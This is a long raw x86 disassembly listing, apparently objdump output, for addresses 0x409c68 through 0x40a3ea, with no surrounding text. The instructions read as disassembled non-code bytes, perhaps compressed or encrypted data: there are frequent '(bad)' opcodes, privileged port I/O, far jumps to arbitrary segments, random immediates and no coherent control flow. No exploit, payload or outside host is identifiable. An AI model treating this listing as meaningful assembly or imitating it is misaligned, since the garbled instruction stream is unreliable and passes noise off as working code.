  409c68:	int    0x2
  409c6a:	push   ds
  409c6b:	hlt    
  409c6c:	in     al,0xdd
  409c6e:	add    dh,bl
  409c70:	pop    ss
  409c71:	fadd   st,st(3)
  409c73:	in     al,dx
  409c74:	lahf   
  409c75:	mov    ds:0xb4257870,al
  409c7a:	shl    BYTE PTR [eax+0x7d986ff],1
  409c80:	dec    ebp
  409c81:	cld    
  409c82:	enter  0xa5b8,0x38
  409c86:	imul   ecx,DWORD PTR [ecx],0x59
  409c89:	adc    DWORD PTR [ecx],esi
  409c8b:	pop    ecx
  409c8c:	dec    edx
  409c8d:	pop    ecx
  409c8e:	sbb    ecx,ecx
  409c90:	adc    eax,esp
  409c92:	push   0xffffffbb
  409c94:	xor    BYTE PTR [edx],bh
  409c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c97:	es in  eax,dx
  409c99:	mov    BYTE PTR [edi],ah
  409c9b:	jnp    0x409cbf
  409c9d:	inc    ebp
  409c9e:	outs   dx,DWORD PTR ds:[esi]
  409c9f:	clc    
  409ca0:	fcom   DWORD PTR [ebp-0x7addc9f8]
  409ca6:	inc    ebx
  409ca7:	in     eax,dx
  409ca8:	inc    ebx
  409ca9:	test   DWORD PTR [eax+0x2b],ecx
  409cac:	mov    BYTE PTR ds:0x9df98ec4,bh
  409cb2:	cmc    
  409cb3:	inc    edi
  409cb4:	imul   eax,esi,0xffffffc1
  409cb7:	mov    ch,0xef
  409cb9:	inc    ecx
  409cba:	outs   dx,BYTE PTR ds:[esi]
  409cbb:	inc    ebx
  409cbc:	bnd js 0x409d2f
  409cbf:	sub    edx,esi
  409cc1:	fmul   DWORD PTR ds:[eax+0x1a]
  409cc5:	mov    esi,0x7680e30b
  409cca:	push   eax
  409ccb:	popf   
  409ccc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ccd:	lea    esp,[ebx+0x26]
  409cd0:	mov    ecx,0x1ed57ccb
  409cd5:	adc    eax,0x6f2fd592
  409cda:	cwde   
  409cdb:	sub    eax,0xeb5963fd
  409ce0:	arpl   bx,ax
  409ce2:	mov    dh,0x99
  409ce4:	add    eax,0xcd9d8a8d
  409ce9:	or     al,0xe9
  409ceb:	out    0x93,al
  409ced:	pop    ecx
  409cee:	sub    eax,0x317eddb5
  409cf3:	(bad)  
  409cf5:	sbb    BYTE PTR [esi],bl
  409cf7:	ins    BYTE PTR es:[edi],dx
  409cf8:	dec    ebx
  409cf9:	sbb    esp,DWORD PTR [edx+0x73d094b4]
  409cff:	repnz dec edx
  409d01:	xchg   BYTE PTR [esi-0x5704f0d4],dh
  409d07:	xchg   ebp,eax
  409d08:	out    0xa3,eax
  409d0a:	call   0xd3f7:0xd7832f60
  409d11:	adc    al,0xf1
  409d13:	jecxz  0x409cc9
  409d15:	fcom   QWORD PTR [esi]
  409d17:	xor    esp,edx
  409d19:	int3   
  409d1a:	pop    es
  409d1b:	into   
  409d1c:	push   edx
  409d1d:	sbb    ecx,DWORD PTR [ebx+0x6a]
  409d20:	pop    esi
  409d21:	cmc    
  409d22:	pop    es
  409d23:	into   
  409d24:	or     al,0x8f
  409d26:	cmp    al,0x53
  409d28:	inc    eax
  409d29:	jge    0x409d64
  409d2b:	cld    
  409d2c:	xchg   esp,eax
  409d2d:	inc    edi
  409d2e:	or     al,BYTE PTR [ebp-0x65]
  409d31:	iret   
  409d32:	dec    edi
  409d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d34:	ret    0xd7c8
  409d37:	test   al,0x2b
  409d39:	jne    0x409dab
  409d3b:	(bad)  
  409d3c:	jl     0x409d34
  409d3e:	jno    0x409cd1
  409d40:	jle    0x409d49
  409d42:	ret    
  409d43:	sbb    ch,BYTE PTR ds:[ebx+0x39084753]
  409d4a:	xor    BYTE PTR [ebx+0x7a126b86],bh
  409d50:	sahf   
  409d51:	test   BYTE PTR [edx+0x4e751d94],al
  409d57:	pop    ebx
  409d58:	outs   dx,BYTE PTR ds:[esi]
  409d59:	loope  0x409d26
  409d5b:	jecxz  0x409dcf
  409d5d:	(bad)  
  409d5e:	xchg   DWORD PTR ds:[edx],esi
  409d61:	adc    bl,bl
  409d63:	and    BYTE PTR [esp+ebx*8-0x6923a77c],dl
  409d6a:	cmp    edx,ebp
  409d6c:	pop    ds
  409d6d:	dec    esp
  409d6e:	xor    eax,0xa9382b4c
  409d73:	mov    dh,0x7a
  409d75:	jp     0x409dde
  409d77:	pusha  
  409d78:	int3   
  409d79:	jl     0x409d83
  409d7b:	add    BYTE PTR es:[esi+0x32c69b6b],ah
  409d82:	add    DWORD PTR [ebx],0x9fea80e7
  409d88:	test   DWORD PTR [ebx],edi
  409d8a:	fisubr DWORD PTR [esi-0x18a371b2]
  409d90:	test   al,0x80
  409d92:	jge    0x409d3b
  409d94:	pop    esp
  409d95:	and    DWORD PTR [edx+0x3a],ecx
  409d98:	xchg   edx,eax
  409d99:	adc    bh,bl
  409d9b:	sub    BYTE PTR [ecx],ch
  409d9d:	xchg   ebp,eax
  409d9e:	scas   eax,DWORD PTR es:[edi]
  409d9f:	lea    esp,[edi+0x39]
  409da2:	loop   0x409dbb
  409da4:	xchg   ecx,eax
  409da5:	leave  
  409da6:	les    ebp,FWORD PTR [ebx-0x46]
  409da9:	mov    esi,0x6269af70
  409dae:	push   edx
  409daf:	iret   
  409db0:	mov    eax,0x9b686529
  409db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409db6:	cdq    
  409db7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409db8:	inc    ebp
  409db9:	loope  0x409df9
  409dbb:	xor    eax,DWORD PTR [esi-0x33]
  409dbe:	or     DWORD PTR [edi],edx
  409dc0:	mov    bh,0xd0
  409dc2:	adc    ebp,DWORD PTR [esi+0x35be7e9e]
  409dc8:	cwde   
  409dc9:	push   ecx
  409dca:	fmul   st,st(3)
  409dcc:	push   ecx
  409dcd:	add    ebx,0x4c
  409dd0:	jmp    0x120a6600
  409dd5:	mov    cl,0x74
  409dd7:	push   esp
  409dd8:	fwait
  409dd9:	push   ds
  409dda:	cmp    BYTE PTR [eax+eiz*8-0x7b5162e1],dh
  409de1:	inc    edi
  409de2:	xchg   ebx,eax
  409de3:	mov    edi,0x34b29ffe
  409de8:	add    al,0x6
  409dea:	aas    
  409deb:	dec    dx
  409ded:	dec    esp
  409dee:	mov    esp,0x1543476c
  409df3:	mov    edi,0xaee9eaf1
  409df8:	cli    
  409df9:	xchg   ebx,eax
  409dfa:	loope  0x409e4f
  409dfc:	dec    ecx
  409dfd:	cld    
  409dfe:	mov    ch,bh
  409e00:	pop    ebp
  409e01:	call   0x72c9bbb
  409e06:	cmp    BYTE PTR [ebp+eax*8+0x3ee7de5f],ah
  409e0d:	(bad)  
  409e0e:	lea    esi,ds:0x71dc029d
  409e14:	aad    0xf8
  409e16:	push   esi
  409e17:	inc    esp
  409e18:	aad    0x5a
  409e1a:	test   eax,0x5c0171cc
  409e1f:	sbb    DWORD PTR [ebp+0x10],ebx
  409e22:	stc    
  409e23:	popa   
  409e24:	jo     0x409e30
  409e26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e27:	pop    ds
  409e28:	mov    ecx,0x4ac6d694
  409e2d:	pop    ebp
  409e2e:	jmp    0x409dc7
  409e30:	add    edx,DWORD PTR [ebp+0x44]
  409e33:	les    esp,FWORD PTR [eax-0x68]
  409e36:	mov    al,ds:0x37d90c2f
  409e3c:	loope  0x409dcd
  409e3e:	out    dx,al
  409e3f:	es xchg edi,eax
  409e41:	nop
  409e42:	fild   WORD PTR [esi]
  409e44:	stc    
  409e45:	test   al,0x69
  409e47:	jno    0x409e5d
  409e49:	xchg   edx,eax
  409e4a:	ret    
  409e4b:	test   BYTE PTR [eax],dl
  409e4d:	xchg   esi,eax
  409e4e:	test   eax,0x1a82832f
  409e54:	outs   dx,BYTE PTR ds:[esi]
  409e55:	push   esi
  409e56:	xor    eax,0x40c33910
  409e5b:	stos   BYTE PTR es:[edi],al
  409e5c:	data16 jge 0x409e8b
  409e5f:	sbb    DWORD PTR [edi+eiz*1-0x6f],eax
  409e63:	mov    ecx,0x307f65ba
  409e68:	sbb    ah,ch
  409e6a:	das    
  409e6b:	sbb    BYTE PTR [ecx],ch
  409e6d:	rol    DWORD PTR [edi],0x1c
  409e70:	cmp    ebp,ebx
  409e72:	or     BYTE PTR [eax+0x15],al
  409e75:	pop    edi
  409e76:	out    0xa0,eax
  409e78:	mov    esi,0xd5e7e24e
  409e7d:	into   
  409e7e:	ret    0x51ff
  409e81:	lea    eax,[ebp-0x43]
  409e84:	sub    ebx,ecx
  409e86:	int3   
  409e87:	(bad)  
  409e88:	aam    0xb1
  409e8a:	mov    ebp,0x2d377c69
  409e8f:	ret    0x5b91
  409e92:	fwait
  409e93:	jmp    0x97bf:0x92b3df1b
  409e9a:	jns    0x409eef
  409e9c:	xchg   esi,eax
  409e9d:	cmp    BYTE PTR [ecx],dh
  409e9f:	mov    di,0x8eb9
  409ea3:	in     eax,0xe1
  409ea5:	sti    
  409ea6:	scas   eax,DWORD PTR es:[edi]
  409ea7:	rcr    DWORD PTR [esi],cl
  409ea9:	(bad)  
  409eab:	repz in al,0xf7
  409eae:	dec    ebp
  409eaf:	lods   al,BYTE PTR ds:[esi]
  409eb0:	and    cl,BYTE PTR [esi-0x16]
  409eb3:	(bad)  
  409eb4:	test   DWORD PTR [esp+eax*8+0x21],0xab3fc8a9
  409ebc:	xchg   edi,eax
  409ebd:	dec    esi
  409ebe:	jle    0x409f1e
  409ec0:	mov    esi,0xa7f0484
  409ec5:	pop    ecx
  409ec6:	add    BYTE PTR [esi+edx*8+0x7cd4a715],0x2f
  409ece:	shl    DWORD PTR [ebx-0x30],1
  409ed1:	stc    
  409ed2:	ins    BYTE PTR es:[edi],dx
  409ed3:	jp     0x409eb8
  409ed5:	pusha  
  409ed6:	outs   dx,BYTE PTR ds:[esi]
  409ed7:	js     0x409eaa
  409ed9:	push   es
  409eda:	cmp    bl,BYTE PTR [ebx]
  409edc:	xchg   ebp,eax
  409edd:	pop    esp
  409ede:	mov    edi,0xbe9af4dc
  409ee3:	aam    0xaa
  409ee5:	pop    esi
  409ee6:	gs dec edi
  409ee8:	ds xor al,0xda
  409eeb:	repz xchg edx,eax
  409eed:	int    0xed
  409eef:	and    BYTE PTR [eax-0x559fd133],cl
  409ef5:	push   es
  409ef6:	ins    DWORD PTR es:[edi],dx
  409ef7:	inc    ebx
  409ef8:	out    dx,eax
  409ef9:	inc    esp
  409efa:	xor    eax,ecx
  409efc:	or     edi,DWORD PTR [ebp+0x14b8779d]
  409f02:	(bad)  
  409f03:	or     BYTE PTR [esi+0x67],al
  409f06:	pop    esi
  409f07:	add    DWORD PTR [eax],0x6351409f
  409f0d:	imul   esi,DWORD PTR [esi+0x342b9227],0xfffffff8
  409f14:	mov    al,ds:0xc99a2fc1
  409f19:	dec    esi
  409f1a:	cld    
  409f1b:	nop
  409f1c:	dec    esp
  409f1d:	adc    esp,DWORD PTR [edx+0x2616bee9]
  409f23:	dec    eax
  409f24:	xchg   DWORD PTR [esi+0x18],esi
  409f27:	xchg   esp,eax
  409f28:	and    eax,0x3c1322b8
  409f2d:	mov    edi,0x3891c48b
  409f32:	push   edx
  409f34:	cmp    eax,ebp
  409f36:	mov    ds:0x5ab811ba,al
  409f3b:	fs pop ds
  409f3d:	jne    0x409f6f
  409f3f:	cwde   
  409f40:	mov    al,ds:0xccc1ad3f
  409f45:	push   DWORD PTR [ebp-0x2e8cad15]
  409f4b:	repnz xchg ebx,eax
  409f4d:	push   ecx
  409f4e:	sub    dh,0x37
  409f51:	je     0x409f0a
  409f53:	cmp    eax,0xfb3b6e44
  409f58:	fs fadd st(0),st
  409f5b:	sbb    BYTE PTR [eax],dl
  409f5d:	sub    DWORD PTR [ebx+0x24],0xac91982d
  409f64:	(bad)  
  409f65:	push   eax
  409f66:	jne    0x409fdf
  409f68:	pop    es
  409f69:	push   edi
  409f6a:	sub    DWORD PTR [esp+edi*8+0x23],0xffffff8c
  409f6f:	jae    0x409f70
  409f71:	sbb    BYTE PTR [edi+ecx*8],ch
  409f74:	cmp    al,0x14
  409f76:	xchg   ebp,eax
  409f77:	shl    ebp,cl
  409f79:	lock pop esi
  409f7b:	mov    cl,0xa3
  409f7d:	jg     0x409fe5
  409f7f:	xchg   edi,eax
  409f80:	adc    BYTE PTR [edi-0x3cd1e6e3],0x7
  409f87:	retf   0xce0
  409f8a:	lods   eax,DWORD PTR ds:[esi]
  409f8b:	xor    ecx,DWORD PTR [eax+eax*4-0x533cd7da]
  409f92:	popw   ss
  409f94:	push   edi
  409f95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f96:	xlat   BYTE PTR ds:[ebx]
  409f97:	fwait
  409f98:	xchg   esi,eax
  409f99:	sar    DWORD PTR [edx+eax*8+0x6fa1c883],1
  409fa0:	fst    DWORD PTR [edi-0x50]
  409fa3:	mov    edi,0xc41d0249
  409fa8:	xor    al,0xab
  409faa:	jmp    0x40a00d
  409fac:	inc    eax
  409fad:	call   0x16fc:0x54ff7005
  409fb4:	pop    esi
  409fb5:	sub    BYTE PTR [edi+ebp*2],bh
  409fb8:	inc    esp
  409fb9:	test   al,al
  409fbb:	outs   dx,BYTE PTR ds:[esi]
  409fbc:	lahf   
  409fbd:	adc    eax,0xfe26b525
  409fc2:	xchg   esi,eax
  409fc3:	mov    ebp,0x1da87a4f
  409fc8:	pop    DWORD PTR ds:0x9f7ca312
  409fce:	pop    ebx
  409fcf:	iret   
  409fd0:	add    al,0x13
  409fd2:	imul   edi,DWORD PTR [ecx],0x8a1189ce
  409fd8:	mov    ecx,0x2881c42a
  409fdd:	mov    ds:0x975eeb50,al
  409fe2:	jp     0x40a033
  409fe4:	dec    DWORD PTR [eax-0xa020070]
  409fea:	aas    
  409feb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fec:	push   esi
  409fed:	jns    0x40a049
  409fef:	(bad)  
  409ff0:	jns    0x409fcd
  409ff2:	aas    
  409ff3:	sbb    DWORD PTR [edx+0x76159cd2],ebx
  409ff9:	xchg   esp,eax
  409ffa:	push   edx
  409ffb:	into   
  409ffc:	sbb    BYTE PTR es:[eax-0xf],dl
  40a000:	jbe    0x409f88
  40a002:	or     ah,bh
  40a004:	xchg   edx,eax
  40a005:	sbb    dh,al
  40a007:	dec    ebx
  40a008:	push   esp
  40a009:	mov    bh,0x96
  40a00b:	ret    0x2163
  40a00e:	ror    DWORD PTR [ecx+0x19],cl
  40a011:	sahf   
  40a012:	sub    eax,0xfaa53a87
  40a017:	sbb    DWORD PTR [eax],esi
  40a019:	sub    BYTE PTR [ebx+ebp*8],bl
  40a01c:	pmuludq mm1,mm4
  40a01f:	les    ebp,FWORD PTR [edx+0x31]
  40a022:	pusha  
  40a023:	test   eax,0xadf65b65
  40a028:	fwait
  40a029:	xchg   edi,eax
  40a02a:	or     eax,0x3c310a18
  40a02f:	retf   
  40a030:	popa   
  40a031:	jbe    0x40a00f
  40a033:	int3   
  40a034:	cwde   
  40a035:	cmp    DWORD PTR [eax-0x2a3257c0],0x23ff6cfa
  40a03f:	aas    
  40a040:	ins    BYTE PTR es:[edi],dx
  40a041:	lea    esp,[eax+0x7285f463]
  40a047:	sbb    bh,BYTE PTR [esi-0x5e]
  40a04a:	add    BYTE PTR [edx-0x3745a924],bh
  40a050:	dec    edx
  40a051:	ins    DWORD PTR es:[edi],dx
  40a052:	and    al,0xa5
  40a054:	mov    ds:0x9f0bb898,al
  40a059:	in     al,dx
  40a05a:	and    al,0xb6
  40a05c:	jae    0x40a057
  40a05e:	sub    al,0xd6
  40a060:	loop   0x40a0b3
  40a062:	push   es
  40a063:	fadd   DWORD PTR [ebx+ecx*2-0x1b76cff]
  40a06a:	adc    eax,0xdf799b72
  40a06f:	call   FWORD PTR [edx+0x5c]
  40a072:	push   ecx
  40a073:	and    dl,BYTE PTR [edx+0x49]
  40a076:	loop   0x40a0ec
  40a078:	jmp    0xb83:0x40adaa04
  40a07f:	and    eax,0xf4d2ddae
  40a084:	sub    BYTE PTR [eax-0x26fe0fc2],dh
  40a08a:	or     al,0xe1
  40a08c:	ret    0x6a5f
  40a08f:	or     eax,DWORD PTR [eax+0x37432cf1]
  40a095:	call   0xe22a:0xe00511d
  40a09c:	dec    ebp
  40a09d:	and    al,0x7e
  40a09f:	(bad)
  40a0a2:	cli    
  40a0a3:	mov    ds:0x85859a0c,al
  40a0a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0a9:	fist   WORD PTR [ebx]
  40a0ab:	add    bl,cl
  40a0ad:	or     eax,0xd0fd1270
  40a0b2:	test   ebx,edx
  40a0b4:	add    bl,BYTE PTR [ebp+0x7a]
  40a0b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0b8:	pop    ecx
  40a0b9:	pop    es
  40a0ba:	outs   dx,DWORD PTR ds:[esi]
  40a0bb:	aad    0xe2
  40a0bd:	in     al,dx
  40a0be:	mov    ecx,0xd5234763
  40a0c3:	sbb    eax,0xa2b15c5b
  40a0c8:	js     0x40a118
  40a0ca:	add    eax,DWORD PTR [edx+0x28]
  40a0cd:	add    BYTE PTR [ebx+eiz*8],0xd7
  40a0d1:	xor    al,0x2f
  40a0d3:	mov    WORD PTR [ebp+0x763c2748],gs
  40a0d9:	(bad)
  40a0dc:	(bad)  
  40a0dd:	xchg   ecx,eax
  40a0de:	dec    ecx
  40a0df:	cmp    BYTE PTR [eax],0x4d
  40a0e2:	fadd   QWORD PTR [edx]
  40a0e4:	dec    ebp
  40a0e5:	mov    WORD PTR [ebx+0x669b51b4],ds
  40a0eb:	addr16 push esp
  40a0ed:	cli    
  40a0ee:	add    BYTE PTR [ecx-0x25],0xfe
  40a0f2:	in     eax,0x96
  40a0f4:	sti    
  40a0f5:	dec    cx
  40a0f7:	pop    esp
  40a0f8:	into   
  40a0f9:	jmp    0x40a11d
  40a0fb:	hlt    
  40a0fc:	adc    ebp,DWORD PTR [esi-0x547f3206]
  40a102:	cmp    esi,DWORD PTR [ebx+0x30]
  40a105:	in     al,0x2a
  40a107:	ds mov bh,0x61
  40a10a:	(bad)  
  40a10b:	stos   DWORD PTR es:[edi],eax
  40a10c:	xchg   edx,eax
  40a10d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a10e:	jl     0x40a0be
  40a110:	stos   DWORD PTR es:[edi],eax
  40a111:	shl    BYTE PTR [eax+0x18b64c44],0x6
  40a118:	leave  
  40a119:	(bad)  
  40a11a:	in     eax,0x45
  40a11c:	fld    QWORD PTR [edi+edx*8]
  40a11f:	mov    cl,0x9b
  40a121:	fcomp  QWORD PTR [eax-0x46]
  40a124:	cmp    edx,esp
  40a126:	inc    esp
  40a127:	jae    0x40a10c
  40a129:	hlt    
  40a12a:	push   ecx
  40a12b:	mov    edi,0x2d7f825c
  40a130:	in     eax,0x85
  40a132:	or     al,0xed
  40a134:	stos   BYTE PTR es:[edi],al
  40a135:	lahf   
  40a136:	repz mov edi,0x6c3aa4e8
  40a13c:	ds inc ecx
  40a13e:	mov    esi,edi
  40a140:	mov    es,WORD PTR [eax-0xd8df1cc]
  40a146:	fsubr  DWORD PTR [ebx-0x66]
  40a149:	push   0xdd3a86bd
  40a14e:	sbb    eax,0x41108c6c
  40a153:	xor    ecx,edi
  40a155:	loopne 0x40a16c
  40a157:	ret    
  40a158:	xor    cl,BYTE PTR [edx]
  40a15a:	cmp    BYTE PTR [esi],ch
  40a15c:	fs xor eax,0x2df7bddf
  40a162:	lods   eax,DWORD PTR ds:[esi]
  40a163:	inc    ecx
  40a164:	ja     0x40a16d
  40a166:	sub    cl,dh
  40a168:	ret    0x4418
  40a16b:	jp     0x40a11a
  40a16d:	out    dx,eax
  40a16e:	sbb    dh,bl
  40a170:	and    dl,0xb9
  40a173:	(bad)
  40a176:	pop    es
  40a177:	add    eax,0x1d632bb6
  40a17c:	mov    edi,0x4f0e1393
  40a181:	lahf   
  40a182:	sub    BYTE PTR [ebp+0x57],0xc9
  40a186:	xchg   BYTE PTR [edi-0x1bd4fa94],dl
  40a18c:	jmp    0x881b:0x700aff61
  40a193:	pop    ebx
  40a194:	es addr16 mov al,0x89
  40a198:	dec    edx
  40a199:	ins    BYTE PTR es:[edi],dx
  40a19a:	pop    ebp
  40a19b:	push   ebx
  40a19c:	push   es
  40a19d:	cmp    al,0xd2
  40a19f:	dec    edx
  40a1a0:	or     dh,BYTE PTR ds:0xc2097d31
  40a1a6:	push   es
  40a1a7:	dec    eax
  40a1a8:	(bad)  
  40a1a9:	cmp    BYTE PTR [edi],dh
  40a1ab:	fucomi st,st(7)
  40a1ad:	mov    al,ds:0x1083ca5
  40a1b2:	dec    esi
  40a1b3:	fwait
  40a1b4:	or     DWORD PTR [edi-0x75],ebx
  40a1b7:	add    esi,esi
  40a1b9:	mov    eax,DWORD PTR [esi]
  40a1bb:	shl    cl,1
  40a1bd:	mov    esi,0xad87b36d
  40a1c2:	mov    ch,0xaf
  40a1c4:	pop    esi
  40a1c5:	popa   
  40a1c6:	jnp    0x40a1bd
  40a1c8:	jne    0x40a165
  40a1ca:	jnp    0x40a1a3
  40a1cc:	and    al,0xa6
  40a1ce:	pop    ebp
  40a1cf:	inc    ecx
  40a1d0:	xchg   esi,eax
  40a1d2:	dec    esp
  40a1d3:	lds    esp,FWORD PTR [esi]
  40a1d5:	ins    DWORD PTR es:[edi],dx
  40a1d6:	jne    0x40a216
  40a1d8:	mov    cl,0x98
  40a1da:	inc    BYTE PTR [ebx+esi*4]
  40a1dd:	jmp    0x40a216
  40a1df:	ins    BYTE PTR es:[edi],dx
  40a1e0:	or     al,0x1b
  40a1e2:	mov    eax,ds:0x9da19121
  40a1e7:	(bad)  [edi-0xb0d44e3]
  40a1ed:	stos   DWORD PTR es:[edi],eax
  40a1ee:	cmp    DWORD PTR [esi-0x4d],ebx
  40a1f1:	mov    al,0x4
  40a1f3:	frstpm(287 only) 
  40a1f5:	and    al,0xbc
  40a1f7:	call   0xa84b7060
  40a1fc:	inc    esi
  40a1fd:	inc    eax
  40a1fe:	dec    edx
  40a1ff:	mov    cl,cl
  40a201:	mov    al,ds:0xba3704bb
  40a206:	popa   
  40a207:	cli    
  40a208:	aam    0x4f
  40a20a:	lahf   
  40a20b:	sub    BYTE PTR [ecx+0x61e80a81],ch
  40a211:	bound  edi,QWORD PTR [edx]
  40a213:	aam    0x71
  40a215:	ret    0xd97d
  40a218:	sbb    bh,bh
  40a21a:	jmp    0xcd6c5b91
  40a21f:	fist   DWORD PTR [edx]
  40a221:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a222:	push   eax
  40a223:	das    
  40a224:	mov    eax,ds:0xbc598a2c
  40a229:	les    edx,FWORD PTR [ebp+ebx*8-0x517f1f2e]
  40a230:	pop    ss
  40a231:	out    0xe9,eax
  40a233:	xor    bl,bh
  40a235:	mov    bh,BYTE PTR [esp+esi*4+0x28]
  40a239:	or     al,0xc7
  40a23b:	ins    BYTE PTR es:[edi],dx
  40a23c:	fcmovu st,st(2)
  40a23e:	sbb    DWORD PTR [eax],ebx
  40a240:	leave  
  40a241:	lods   eax,DWORD PTR ds:[esi]
  40a242:	sar    edx,1
  40a244:	cdq    
  40a245:	ret    0x1d7e
  40a248:	das    
  40a249:	popf   
  40a24a:	jge    0x40a2a6
  40a24c:	int    0xeb
  40a24e:	add    BYTE PTR [ecx+0x69230bea],ah
  40a254:	and    dl,BYTE PTR gs:0x87eb
  40a25a:	sbb    eax,0xb8d6d92
  40a25f:	sub    ebp,ebp
  40a261:	loop   0x40a2d5
  40a263:	retf   0xeb3d
  40a266:	test   eax,0x68e7381b
  40a26b:	and    eax,0xbd40a4ad
  40a270:	sbb    eax,0x6a821f43
  40a275:	mov    ch,0x21
  40a277:	push   ss
  40a278:	add    al,0xa7
  40a27a:	or     BYTE PTR [edi+edx*1],0xf5
  40a27e:	cmp    al,0x74
  40a280:	sub    al,0x8a
  40a282:	inc    edx
  40a283:	nop
  40a284:	sbb    bh,al
  40a286:	stos   DWORD PTR es:[edi],eax
  40a287:	jne    0x40a28a
  40a289:	cmp    al,0xfd
  40a28b:	mov    ch,0xbd
  40a28d:	int3   
  40a28e:	xor    BYTE PTR [edi+0x5f],0xde
  40a292:	mov    ebp,0x8d49063
  40a297:	sub    edi,ecx
  40a299:	fld    TBYTE PTR [edi]
  40a29b:	jb     0x40a2fe
  40a29d:	or     ah,BYTE PTR [edx]
  40a29f:	aam    0x2f
  40a2a1:	push   esi
  40a2a2:	lahf   
  40a2a3:	outs   dx,BYTE PTR ds:[esi]
  40a2a4:	jo     0x40a23d
  40a2a6:	xor    cl,bh
  40a2a8:	mov    esi,cs
  40a2aa:	xchg   esp,eax
  40a2ab:	scas   eax,DWORD PTR es:[edi]
  40a2ac:	cmp    edx,ebp
  40a2ae:	test   eax,0x7ab956cc
  40a2b3:	ja     0x40a2da
  40a2b5:	jb     0x40a262
  40a2b7:	cmp    BYTE PTR [esi+0x674f8b0],al
  40a2bd:	into   
  40a2be:	(bad)  
  40a2bf:	in     al,0x8d
  40a2c1:	iret   
  40a2c2:	mov    esp,0x38b3d86d
  40a2c7:	xor    ebp,DWORD PTR [eax]
  40a2c9:	or     eax,0xd7d08d89
  40a2ce:	add    DWORD PTR [edx],ebx
  40a2d0:	sahf   
  40a2d1:	and    DWORD PTR [eax],edi
  40a2d3:	or     BYTE PTR [ebx+esi*2],dh
  40a2d6:	xor    ebx,esp
  40a2d8:	sub    al,0x29
  40a2da:	sub    BYTE PTR [eax+0x7157b630],al
  40a2e0:	xor    DWORD PTR [edi+esi*8-0x38],eax
  40a2e4:	pop    eax
  40a2e5:	hlt    
  40a2e6:	pusha  
  40a2e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2e8:	mov    edi,0xff056fac
  40a2ed:	mov    edx,DWORD PTR [edx]
  40a2ef:	inc    esp
  40a2f0:	push   ebx
  40a2f1:	retf   0xf5b6
  40a2f4:	test   al,0xc1
  40a2f6:	std    
  40a2f7:	inc    edi
  40a2f8:	mov    cl,0xa0
  40a2fa:	inc    ebp
  40a2fb:	pop    eax
  40a2fc:	mov    esi,0x596c15c3
  40a301:	fcom   QWORD PTR [esi]
  40a303:	and    ch,BYTE PTR [esi-0x10]
  40a306:	or     ah,ch
  40a308:	mov    BYTE PTR [ebp-0x4c],bh
  40a30b:	jae    0x40a2dc
  40a30d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a30e:	or     bh,BYTE PTR [ebx+0x3a]
  40a311:	pop    ebx
  40a312:	mov    bl,BYTE PTR [ecx+0x207950aa]
  40a318:	outs   dx,DWORD PTR ds:[esi]
  40a319:	mov    esi,0xce9adea4
  40a31e:	ins    BYTE PTR es:[edi],dx
  40a31f:	sbb    BYTE PTR [esp+esi*8-0x3a8bb19b],cl
  40a326:	xor    BYTE PTR [edi-0x1fbdb0e],bh
  40a32c:	mov    esp,0xd3cb0188
  40a331:	pop    edx
  40a332:	push   edx
  40a333:	iret   
  40a334:	adc    BYTE PTR [ebx-0x4369213d],dl
  40a33a:	cld    
  40a33b:	or     ah,BYTE PTR [ebp+esi*1+0x47959970]
  40a342:	(bad)  
  40a343:	sub    ebp,DWORD PTR [ebp+0x1b3dc930]
  40a349:	or     ecx,DWORD PTR [esi+0x1621938a]
  40a34f:	ficom  WORD PTR ds:0xbad59e1f
  40a355:	popa   
  40a356:	imul   edi,DWORD PTR es:[edi-0x4a],0x23
  40a35b:	std    
  40a35c:	xchg   ecx,eax
  40a35d:	ror    BYTE PTR gs:[esp+esi*4+0x4924f4e7],0xc9
  40a366:	xchg   esp,eax
  40a367:	jnp    0x40a328
  40a369:	or     al,0x32
  40a36b:	or     eax,0xbfff008
  40a370:	mov    dh,0x94
  40a372:	popf   
  40a373:	hlt    
  40a374:	mul    DWORD PTR [esi]
  40a376:	or     al,0xe0
  40a378:	ja     0x40a3a1
  40a37a:	enter  0x94be,0x6d
  40a37e:	popf   
  40a37f:	jl     0x40a382
  40a381:	inc    esp
  40a382:	adc    al,0xcd
  40a384:	rcr    BYTE PTR [eax+0x97912d0],cl
  40a38a:	push   ss
  40a38b:	scas   al,BYTE PTR es:[edi]
  40a38c:	repnz int 0xb7
  40a38f:	repz xor eax,0x2afae4c7
  40a395:	div    bl
  40a397:	dec    edx
  40a398:	pop    eax
  40a399:	and    al,0x1d
  40a39c:	push   ss
  40a39d:	sub    ch,bl
  40a39f:	jge    0x40a3cb
  40a3a1:	pop    eax
  40a3a2:	leave  
  40a3a3:	dec    edi
  40a3a4:	lock aas 
  40a3a6:	and    al,0x8
  40a3a8:	das    
  40a3a9:	xchg   ebp,eax
  40a3aa:	out    0x12,eax
  40a3ac:	mov    eax,0x39632bd1
  40a3b1:	xor    esi,edx
  40a3b3:	je     0x40a381
  40a3b5:	clc    
  40a3b6:	inc    edi
  40a3b7:	mov    ?,WORD PTR [ebx+eax*8+0x494fba5f]
  40a3be:	test   eax,0x6cddfe1b
  40a3c3:	frstor [ebx]
  40a3c5:	out    dx,eax
  40a3c6:	pop    esi
  40a3c7:	(bad)  
  40a3c8:	iret   
  40a3c9:	push   edi
  40a3ca:	push   eax
  40a3cb:	repnz loopne 0x40a38b
  40a3ce:	sub    DWORD PTR [ebp+0x89c93b6],esi
  40a3d4:	iret   
  40a3d5:	lea    esi,[ebx+0xc]
  40a3d8:	ds mov ebp,0xbf9099b6
  40a3de:	ins    BYTE PTR es:[edi],dx
  40a3df:	mov    edi,0xff36e7ec
  40a3e4:	lock mov esi,0xddc4e260
  40a3ea:	xchg   edx,eax
